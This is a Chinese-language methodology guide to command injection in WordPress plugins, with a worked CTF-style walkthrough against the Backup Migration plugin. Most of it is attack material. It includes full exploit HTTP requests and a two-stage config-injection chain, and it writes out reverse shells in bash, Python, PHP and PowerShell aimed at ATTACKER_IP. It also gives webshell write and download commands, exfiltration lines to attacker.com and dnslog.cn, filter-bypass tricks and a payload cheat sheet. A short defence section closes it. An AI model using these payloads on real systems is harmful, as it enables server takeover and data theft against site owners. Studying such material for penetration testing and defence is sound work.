# WordPress 插件命令注入攻击方法论

## 1. 技术概述

### 1.1 漏洞原理

WordPress 插件命令注入漏洞是指 WordPress 插件在处理用户输入时，未正确过滤或转义 shell 元字符，直接将用户可控数据拼接到系统命令中执行，导致攻击者能够执行任意系统命令。

**本质原因：**
- 应用层代码将用户输入作为系统命令的一部分进行执行
- 违背了"数据与代码分离"的安全原则
- 使用了不恰当的 sanitization 函数（如 `sanitize_text_field()` 仅防 XSS，不防命令注入）

### 1.2 常见漏洞模式

| 模式 | 描述 | 危险函数 |
|------|------|----------|
| 上下文不匹配 sanitization | 使用 XSS 防护函数处理命令输入 | `sanitize_text_field()` + `exec()` |
| 最小化验证 | 仅使用 `trim()` 处理，无 shell 转义 | `trim()` + `exec()` |
| 持久化配置注入 | 恶意配置值存储后在命令中使用 | `bmi_set_config()` + `exec()` |
| 无引号参数注入 | 命令参数未加引号，空格注入 | `exec(cmd . $param)` |

### 1.3 常见命令执行函数

| PHP 函数 | 危险等级 | 说明 |
|----------|----------|------|
| `exec()` | 高危 | 执行外部程序，返回最后一行输出 |
| `system()` | 高危 | 执行外部程序，输出到浏览器 |
| `passthru()` | 高危 | 执行外部程序，原始输出到浏览器 |
| `shell_exec()` | 高危 | 执行 shell 命令，返回完整输出 |
| `popen()` | 高危 | 打开进程文件指针 |
| `proc_open()` | 高危 | 执行命令并打开 I/O 管道 |
| `backtick` | 高危 | `` `command` `` 反引号执行 |

---

## 2. 攻击场景

### 2.1 适用目标系统

| 系统特征 | 风险描述 |
|----------|----------|
| WordPress 插件处理文件/备份 | 备份/恢复功能常调用系统命令 |
| 插件使用 exec() 处理用户输入 | 直接命令注入风险 |
| 插件配置可被低权限用户修改 | 持久化命令注入风险 |
| 插件使用 `is_admin()` 而非 `current_user_can()` | 权限检查绕过风险 |

### 2.2 典型业务场景

| 业务场景 | 功能示例 | 风险点 |
|----------|----------|--------|
| 备份迁移插件 | 创建/恢复/下载备份 | URL 参数、文件名、配置参数注入 |
| 文件管理插件 | 压缩/解压文件 | 文件名参数注入 |
| 图像处理插件 | 图片格式转换 | 调用 ffmpeg 等工具时参数注入 |
| 网络诊断插件 | Ping/Traceroute 测试 | IP/域名参数直接拼接 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 输入点识别

抓取所有与后端交互的请求，重点关注以下参数：
- 看起来像文件路径、URL、域名的参数
- 备份名称、文件名相关参数
- 配置选项参数
- 任何传递到"执行"、"处理"功能的参数

#### 3.1.2 初步探测 Payload

**命令分隔符探测：**
```bash
# 分号分隔（最常用）
; whoami
; id

# 管道符
| whoami
| id

# 逻辑运算符
&& whoami
|| whoami

# 反引号命令替换
`whoami`
$(whoami)
```

**时间延迟探测（无回显场景）：**
```bash
; sleep 5
; ping -c 5 127.0.0.1
```

**DNSLog 外带探测：**
```bash
; curl http://$(whoami).attacker.com
; nslookup $(whoami).attacker.com
```

#### 3.1.3 结果验证

| 响应特征 | 判断 |
|----------|------|
| 响应时间延长 5 秒 | 可能存在命令注入 |
| 返回系统命令输出 | 确认存在命令注入 |
| DNSLog 收到请求 | 确认存在命令注入（无回显） |
| 错误信息包含命令路径 | 可能存在命令注入 |

### 3.2 白盒测试

#### 3.2.1 代码审计关键词

搜索以下危险函数组合：

```php
// 危险模式 1：sanitize_text_field + exec
$user_input = sanitize_text_field($_POST['param']);
exec("command " . $user_input);

// 危险模式 2：trim + exec
$param = trim($_POST['path']);
exec("command " . $param);

// 危险模式 3：配置值直接使用
$config = bmi_get_config('CLI:PATH');
exec($config . " args");

// 危险模式 4：无引号参数
exec("command " . $filename . " " . $type);
```

#### 3.2.2 数据流追踪

1. 定位用户输入点（`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`）
2. 追踪变量传递路径
3. 检查是否经过 `escapeshellarg()` 或 `escapeshellcmd()` 处理
4. 定位到 exec/system/passthru/shell_exec 等 sink 点

---

## 4. 漏洞利用方法

### 4.1 基础信息收集

**系统信息：**
```bash
# 操作系统
uname -a
ver

# 当前用户
whoami
id

# 工作目录
pwd
ls -la

# 环境变量
env
printenv
```

**网络信息：**
```bash
# IP 配置
ifconfig
ip addr
ipconfig

# 路由信息
route
netstat -an
```

### 4.2 文件操作

**读取敏感文件：**
```bash
# Linux
cat /etc/passwd
cat /etc/shadow
cat /var/www/html/wp-config.php

# 读取 Flag（CTF 场景）
cat /opt/flag.txt
cat /flag
env | grep FLAG
```

**写入 Webshell：**
```bash
# 方法 1：echo 写入
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# 方法 2：wget 下载
wget http://attacker.com/shell.php -O /var/www/html/shell.php

# 方法 3：curl 写入
curl http://attacker.com/shell.php -o /var/www/html/shell.php
```

### 4.3 建立反向 Shell

**Bash 反向 Shell：**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

**Python 反向 Shell：**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP 反向 Shell：**
```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**PowerShell 反向 Shell（Windows）：**
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

### 4.4 WordPress 插件特定利用

#### 4.4.1 URL 参数注入（INJ-VULN-01 模式）

**漏洞位置：** `POST /wp-admin/admin-ajax.php?action=backup_migration&f=download-backup`

**Payload 构造：**
```bash
# 双引号逃逸
url=http://test";cat /opt/flag.txt > /tmp/flag.txt;"

# 命令替换
url='http://test";$(cat /opt/flag.txt > /tmp/flag.txt);"'

# 反引号替换
url='http://test";`cat /opt/flag.txt > /tmp/flag.txt`;"'
```

**完整利用请求：**
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Cookie: wordpress_[hash]=[session_cookie]
Content-Type: application/x-www-form-urlencoded

action=backup_migration&token=bmi&f=download-backup&nonce=[nonce]&url=http://test";cat /opt/flag.txt > /var/www/html/flag.txt;"
```

#### 4.4.2 文件名参数注入（INJ-VULN-02 模式）

**漏洞位置：** `POST /wp-admin/admin-ajax.php?action=backup_migration&f=restore-backup`

**Payload 构造（无引号场景）：**
```bash
# 空格分隔注入（更可靠）
file=backup.zip;cat /opt/flag.txt > /tmp/flag;#

# 管道注入
file=backup.zip | cat /opt/flag.txt

# 后台执行
file=backup.zip & cat /opt/flag.txt > /tmp/flag &
```

**完整利用请求：**
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Cookie: wordpress_[hash]=[session_cookie]
Content-Type: application/x-www-form-urlencoded

action=backup_migration&token=bmi&f=restore-backup&nonce=[nonce]&file=backup.zip;cat /opt/flag.txt > /var/www/html/flag.txt;#
```

#### 4.4.3 持久化配置注入（INJ-VULN-04 模式）

**漏洞位置：** `POST /wp-admin/admin-ajax.php?action=backup_migration&f=save-other-options`

**两阶段攻击：**

**阶段 1：存储恶意配置**
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Cookie: wordpress_[hash]=[session_cookie]
Content-Type: application/x-www-form-urlencoded

action=backup_migration&token=bmi&f=save-other-options&nonce=[nonce]&php_cli_manual_path=/tmp/evil.sh
```

**阶段 2：触发执行**
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Cookie: wordpress_[hash]=[session_cookie]
Content-Type: application/x-www-form-urlencoded

action=backup_migration&token=bmi&f=create-backup&nonce=[nonce]
```

**恶意脚本示例：**
```bash
#!/bin/bash
# /tmp/evil.sh
cat /opt/flag.txt > /tmp/pwned.txt
# 继续正常操作避免被发现
exec /usr/bin/php "$@"
```

---

## 5. 绕过技术

### 5.1 字符过滤绕过

**分号过滤绕过：**
```bash
# 使用管道
| whoami

# 使用&&
&& whoami

# 使用换行符
%0awhoami
```

**空格过滤绕过：**
```bash
# Linux IFS 变量
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd

# 重定向符
cat</etc/passwd

# Tab/换行
cat%09/etc/passwd
```

**关键词过滤绕过：**
```bash
# 变量拼接
c=ca;t=c t /etc/passwd

# 双引号分割
c""at /etc/passwd
c''at /etc/passwd

# 反斜杠转义
\c\a\t /etc/passwd
```

### 5.2 编码绕过

**Base64 编码：**
```bash
# 编码命令
echo "Y2F0IC9vcHQvZmxhZy50eHQ=" | base64 -d | bash

# 完整流程
cmd=$(echo "cat /opt/flag.txt" | base64)
echo $cmd | base64 -d | bash > /tmp/flag
```

**URL 编码：**
```bash
# 原始：; cat /opt/flag.txt
# 编码：%3B%20cat%20%2Fopt%2Fflag.txt
```

**十六进制编码：**
```bash
# Bash 十六进制
$'\x63\x61\x74' /opt/flag.txt
```

### 5.3 路径/引号绕过

**路径分隔符绕过：**
```bash
# 双斜杠
cat//etc//passwd

# 混合斜杠
cat/etc/passwd

# 变量方式
DIR=/etc;cat$DIR/passwd
```

**引号闭合绕过：**
```bash
# 双引号场景
";command;"

# 单引号场景
';command;'

# 混合引号
";command;'
```

### 5.4 无回显利用

**DNSLog 外带：**
```bash
# 基础外带
cat /opt/flag.txt | curl http://attacker.com/$(cat /opt/flag.txt | base64)

# DNSLog 平台
cat /opt/flag.txt | nslookup $(cat /opt/flag.txt | base64).dnslog.cn
```

**HTTP 外带：**
```bash
# curl 外带
curl -X POST -d @/opt/flag.txt http://attacker.com/exfil

# wget 外带
wget --post-file=/opt/flag.txt http://attacker.com/exfil
```

**文件写入外带：**
```bash
# 写入 Web 目录
cat /opt/flag.txt > /var/www/html/flag.txt

# 然后 HTTP 获取
curl http://target.com/flag.txt
```

---

## 6. 实战案例

### 6.1 WordPress Backup Migration 插件利用

**目标环境：**
- WordPress 6.5.4
- Backup Migration 插件 v1.3.5
- Flag 位置：`/opt/flag.txt`

**攻击步骤：**

**步骤 1：获取认证会话**
```bash
# 方法 1：创建低权限用户
docker exec wordpress_container php -r '
define("WP_USE_THEMES", false);
require("/var/www/html/wp-load.php");
$user_id = wp_create_user("attacker", "password123", "attacker@test.com");
$user = new WP_User($user_id);
$user->set_role("subscriber");'

# 方法 2：重置 admin 密码
docker exec wordpress_container bash -c "cd /var/www/html && php -r \"
require 'wp-load.php';
global \$wpdb;
\$hash = wp_hash_password('NewPass123');
\$wpdb->update(\$wpdb->users, array('user_pass' => \$hash), array('ID' => 1));
\""
```

**步骤 2：提取 Nonce**
```bash
curl -b cookies.txt "http://target.com/wp-admin/admin.php?page=backup-migration" \
  | grep -oP '"nonce":"?\K[^"]+'
```

**步骤 3：执行命令注入**
```bash
curl -X POST "http://target.com/wp-admin/admin-ajax.php" \
  -b cookies.txt \
  -d "action=backup_migration" \
  -d "f=download-backup" \
  -d "token=bmi" \
  -d "nonce=[extracted_nonce]" \
  -d 'url=http://test";cat /opt/flag.txt > /var/www/html/flag.txt;"'
```

**步骤 4：获取 Flag**
```bash
curl "http://target.com/flag.txt"
# 输出：FLAG{0e640864c2718bb34e01e700391986e28ecd6fbe98b4569ef4ccc4cee16a4b2c}
```

### 6.2 权限提升链

**初始访问 → 命令注入 → 完全控制：**

```
1. 用户名枚举 (AUTH-VULN-05)
   ↓
2. 暴力破解密码 (AUTH-VULN-02/03)
   ↓
3. Subscriber 权限登录
   ↓
4. is_admin() 绕过 (AUTHZ 漏洞)
   ↓
5. 命令注入 (INJ-VULN-01/02/04)
   ↓
6. 读取 Flag / 写入 Webshell / 反向 Shell
   ↓
7. 完全系统控制
```

---

## 7. 检测与防御

### 7.1 检测指标

| 指标 | 检测方法 |
|------|----------|
| 异常系统命令执行 | 监控 exec/system/shell_exec 调用 |
| 命令中包含元字符 | 检测 `;`, `|`, `&`, `$`, `` ` `` |
| 异常文件写入 | 监控 Web 目录写操作 |
| 异常外连请求 | 监控 curl/wget 外连 |

### 7.2 防御措施

**代码层面：**
```php
// 正确做法 1：使用 escapeshellarg
$user_input = $_POST['param'];
$safe_input = escapeshellarg($user_input);
exec("command " . $safe_input);

// 正确做法 2：使用 escapeshellcmd
$user_input = $_POST['cmd'];
$safe_input = escapeshellcmd($user_input);
exec($safe_input);

// 正确做法 3：白名单验证
$allowed = ['backup.zip', 'restore.zip'];
if (!in_array($user_input, $allowed)) {
    die("Invalid input");
}

// 正确做法 4：避免使用 exec
// 使用 PHP 内置函数替代
file_get_contents($file);  // 替代 cat
copy($src, $dst);          // 替代 cp
```

**WordPress 特定修复：**
```php
// 错误：使用 is_admin()
if (is_admin()) {
    // 特权操作
}

// 正确：使用 capability 检查
if (current_user_can('manage_options')) {
    // 特权操作
}
```

---

## 8. Payload 速查表

### 8.1 命令分隔符

| 分隔符 | 适用场景 | 示例 |
|--------|----------|------|
| `;` | 通用 | `cmd1; cmd2` |
| `|` | 管道 | `cmd1 \| cmd2` |
| `||` | 前命令失败时 | `cmd1 \|\| cmd2` |
| `&&` | 前命令成功时 | `cmd1 && cmd2` |
| `&` | 后台执行 | `cmd1 & cmd2` |
| `` ` `` | 命令替换 | `` `cmd` `` |
| `$()` | 命令替换 | `$(cmd)` |

### 8.2 常见利用命令

| 目的 | Linux 命令 |
|------|-----------|
| 读取文件 | `cat /path/to/file` |
| 列出目录 | `ls -la /path` |
| 查找文件 | `find / -name "flag*"` |
| 查看进程 | `ps aux` |
| 网络信息 | `ifconfig`, `ip addr` |
| 用户信息 | `whoami`, `id`, `cat /etc/passwd` |
| 写入文件 | `echo "content" > file` |
| 下载文件 | `curl/wget http://attacker.com/file` |
| 反向 Shell | `bash -i >& /dev/tcp/IP/PORT 0>&1` |

### 8.3 特殊字符编码

| 字符 | URL 编码 | 十六进制 |
|------|----------|----------|
| 空格 | `%20` | `$'\x20'` |
| 分号 | `%3B` | `$'\x3B'` |
| 管道 | `%7C` | `$'\x7C'` |
| 反引号 | `%60` | `$'\x60'` |
| $ | `%24` | `$'\x24'` |
| & | `%26` | `$'\x26'` |

---

## 9. 参考资源

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [GTFOBins - Linux Binary Exploitation](https://gtfobins.github.io/)
- [WordPress Coding Standards - Security](https://developer.wordpress.org/coding-standards/wordpress-coding-standards/security/)
